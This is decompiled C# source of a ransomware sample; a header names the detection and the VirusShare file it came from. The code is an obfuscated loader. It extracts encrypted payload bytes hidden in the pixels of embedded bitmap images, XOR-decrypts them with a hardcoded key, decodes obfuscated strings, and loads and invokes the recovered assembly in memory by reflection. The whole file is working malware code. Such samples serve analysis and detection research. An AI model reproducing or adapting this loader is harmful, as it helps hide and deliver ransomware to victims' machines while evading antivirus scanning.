// Decompiled with JetBrains decompiler
// Type: êýuâÀub
// Assembly: server21, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 44F6D273-423A-438B-8A07-EFA5057376E8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Generic-354494d2423378c80968900ed55fb587efadd64e42a595444273c707e3540f9a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

public class êýuâÀub
{
  private static string ÛÝÀá0gèGÖsä = "VãjcKÇQJYÐÝëðølïØô8A8ÐÒóixþV0e";
  private static ResourceManager ÝýâcßökAøuòqpsSÚl = new ResourceManager("wABmpeakHbXmM", Assembly.GetExecutingAssembly());

  private static byte[] NjfÉéÓEËÛuVVÆF => êýuâÀub.ÍYýîtÂÁÄ3â9núààòy(êýuâÀub.ICÑúû8q4ûýÁYiöÞp3((Bitmap) êýuâÀub.ÝýâcßökAøuòqpsSÚl.GetObject("mjN7RuZjjrH"), êýuâÀub.ÛÝÀá0gèGÖsä));

  private static byte[] ÕzdKîEÌtlÆX9 => êýuâÀub.ÍYýîtÂÁÄ3â9núààòy(êýuâÀub.ICÑúû8q4ûýÁYiöÞp3((Bitmap) êýuâÀub.ÝýâcßökAøuòqpsSÚl.GetObject("CicVkb7RwfYw9w"), êýuâÀub.ÛÝÀá0gèGÖsä));

  [STAThread]
  public static void Main()
  {
    object[] objArray = new object[7]
    {
      (object) êýuâÀub.NjfÉéÓEËÛuVVÆF,
      (object) êýuâÀub.güjOUÓ9ØÒlÕðmÍqBÛÏ0("900F113DA2237868FEB89395"),
      (object) true,
      (object) true,
      (object) true,
      (object) false,
      (object) êýuâÀub.güjOUÓ9ØÒlÕðmÍqBÛÏ0("8A1E1625A222")
    };
    byte[] õzdKîEìtlÆx9 = êýuâÀub.ÕzdKîEÌtlÆX9;
    ref byte[] local1 = ref õzdKîEìtlÆx9;
    string str = êýuâÀub.güjOUÓ9ØÒlÕðmÍqBÛÏ0("AA04092EA425");
    ref string local2 = ref str;
    ref object[] local3 = ref objArray;
    êýuâÀub.vÚÄåÛÝVôòDKà(ref local1, ref local2, ref local3);
  }

  public static void vÚÄåÛÝVôòDKà(
    ref byte[] ÏÏöØÉøu1ÎöQOÛãNm,
    ref string ôÞLf5ßòØËß2UÂ,
    ref object[] lêéQecèûÝéyâ)
  {
    object objectValue = RuntimeHelpers.GetObjectValue(Assembly.Load(ÏÏöØÉøu1ÎöQOÛãNm).CreateInstance(êýuâÀub.güjOUÓ9ØÒlÕðmÍqBÛÏ0("B11F0D1B82")));
    objectValue.GetType().InvokeMember(ôÞLf5ßòØËß2UÂ, BindingFlags.InvokeMethod, (Binder) null, RuntimeHelpers.GetObjectValue(objectValue), lêéQecèûÝéyâ);
  }

  public static string güjOUÓ9ØÒlÕðmÍqBÛÏ0(string ÇÆPÃrDiÙvMsçVWVjñi5)
  {
    long num1 = (long) Math.Round((double) Strings.Len(ÇÆPÃrDiÙvMsçVWVjñi5) / 2.0);
    string str;
    for (long index = 1; index <= num1; ++index)
    {
      int num2 = (int) Math.Round(Conversion.Val("&H" + Strings.Mid(ÇÆPÃrDiÙvMsçVWVjñi5, (int) (2L * index - 1L), 2)));
      int num3 = Strings.AscW(Strings.Mid(êýuâÀub.ÛÝÀá0gèGÖsä, (int) (index % (long) Strings.Len(êýuâÀub.ÛÝÀá0gèGÖsä) + 1L), 1));
      str += Conversions.ToString(Strings.ChrW(num2 ^ num3));
    }
    return str;
  }

  public static byte[] ÍYýîtÂÁÄ3â9núààòy(byte[] E4MÍxc9xð18c)
  {
    byte[] bytes = Encoding.Unicode.GetBytes(êýuâÀub.ÛÝÀá0gèGÖsä);
    byte[] array1 = new byte[0];
    Array.Resize<byte>(ref array1, bytes.Length);
    int index1 = 0;
    int num1 = E4MÍxc9xð18c.Length - 1 - (array1.Length - 1);
    int num2 = E4MÍxc9xð18c.Length - 1;
    for (int index2 = num1; index2 <= num2; ++index2)
    {
      array1[index1] = E4MÍxc9xð18c[index2];
      ++index1;
    }
    byte[] array2 = E4MÍxc9xð18c;
    Array.Resize<byte>(ref array2, E4MÍxc9xð18c.Length - array1.Length);
    int index3 = 0;
    int num3 = array2.Length - 1;
    for (int index4 = 0; index4 <= num3; ++index4)
    {
      array2[index4] = (byte) ((int) E4MÍxc9xð18c[index4] ^ (int) array1[index3] ^ (int) bytes[index3]);
      if (index3 == bytes.Length - 1)
        index3 = 0;
      else
        ++index3;
    }
    return array2;
  }

  public static byte[] ICÑúû8q4ûýÁYiöÞp3(Bitmap ÝçDhZüöU76JÅôóÑÀ, string WY3ØåómÙjÇêZ9Emña3å)
  {
    byte[] array;
    try
    {
      string str = WY3ØåómÙjÇêZ9Emña3å;
      int index1 = 0;
      int num1;
      for (int length = str.Length; index1 < length; ++index1)
      {
        char ch = str[index1];
        num1 += (int) ch;
      }
      int num2 = ÝçDhZüöU76JÅôóÑÀ.Width * ÝçDhZüöU76JÅôóÑÀ.Height;
      for (int x = ÝçDhZüöU76JÅôóÑÀ.Width - 1; x != 0; --x)
      {
        Color color = ÝçDhZüöU76JÅôóÑÀ.GetPixel(x, ÝçDhZüöU76JÅôóÑÀ.Height - 1);
        int num3 = 0;
        int num4 = (int) color.R % (int) byte.MaxValue;
        int num5 = (int) color.B - (num4 % (int) byte.MaxValue + (int) color.G) % (int) byte.MaxValue / 3;
        if ((num4 + (int) byte.MaxValue * num5 ^ num1) == 47)
          --num2;
        color = new Color();
        num3 = 0;
      }
      array = new byte[num2 + 1];
      int index2 = 0;
      for (int x = 0; x != ÝçDhZüöU76JÅôóÑÀ.Width; ++x)
      {
        int y = 0;
        while (y != ÝçDhZüöU76JÅôóÑÀ.Height)
        {
          Color color = ÝçDhZüöU76JÅôóÑÀ.GetPixel(x, y);
          int num6 = 0;
          int num7 = (int) color.R % (int) byte.MaxValue;
          int num8 = (int) color.B - (num7 % (int) byte.MaxValue + (int) color.G) % (int) byte.MaxValue / 3;
          int num9 = num7 + (int) byte.MaxValue * num8 ^ num1;
          if (num9 != 47)
            array[index2] = (byte) (num9 - (int) byte.MaxValue);
          color = new Color();
          num6 = 0;
          ++y;
          ++index2;
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      if (false)
      {
        int num = (int) MessageBox.Show(exception.Message);
      }
      ProjectData.ClearProjectError();
    }
    for (int newSize = array.Length - (Encoding.Unicode.GetByteCount(êýuâÀub.ÛÝÀá0gèGÖsä.ToCharArray()) - 1); newSize != array.Length; ++newSize)
    {
      if (array[newSize] == (byte) 0)
      {
        Array.Resize<byte>(ref array, newSize);
        break;
      }
    }
    return array;
  }
}
